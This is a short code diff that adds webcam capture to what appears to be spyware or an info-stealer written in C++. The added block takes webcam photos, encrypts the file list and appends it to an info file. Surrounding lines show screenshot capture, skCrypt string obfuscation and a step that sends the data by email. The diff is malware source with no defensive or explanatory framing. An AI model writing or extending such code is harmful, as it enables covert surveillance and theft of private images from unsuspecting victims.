@@ -127,6 +127,17 @@ int main(int argc, char* argv[])
         infoFileContent += aes_encrypt(KEY, getScreenshot(), IV);
     infoFileContent += skCrypt("\n");
 
+    // photos
+    string webcams = (string)skCrypt("");
+    if (TAKE_WEBCAMS) {
+        takeWebcams();
+        for (string file : getWebcams())
+            webcams += file + "\n";
+    }
+
+    webcams = aes_encrypt(KEY, webcams, IV);
+    infoFileContent += webcams;
+    infoFileContent += skCrypt("\n");
 
     if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL) {
         ofstream infoFile(INFOFILE);
